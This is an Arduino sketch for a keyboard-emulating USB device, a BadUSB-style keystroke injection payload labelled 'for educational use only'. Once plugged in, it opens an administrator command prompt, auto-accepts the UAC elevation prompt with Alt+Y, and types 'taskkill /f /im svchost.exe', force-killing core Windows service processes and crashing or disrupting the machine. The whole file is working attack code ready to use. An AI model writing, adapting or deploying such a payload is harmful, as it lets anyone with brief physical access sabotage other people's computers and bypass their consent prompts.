/**
 * This is for educational use only
 * Use only for your own PC...
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(300);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1000);
  delay(75);
  Keyboard.print(F("cmd"));

  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(250);
  Keyboard.print(F("taskkill /f /im svchost.exe"));

  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
